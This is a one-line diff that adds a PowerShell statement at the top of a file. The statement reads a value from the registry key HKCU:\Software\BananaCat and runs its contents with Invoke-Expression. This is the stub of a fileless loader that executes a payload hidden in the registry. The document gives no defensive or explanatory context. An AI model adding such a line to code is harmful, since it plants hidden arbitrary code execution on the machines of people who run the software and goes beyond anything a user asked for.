@@ -1,0 +1,1 @@
+Invoke-Expression (Get-ItemProperty -Path "HKCU:\Software\BananaCat" -Name "BananaCat").BananaCat
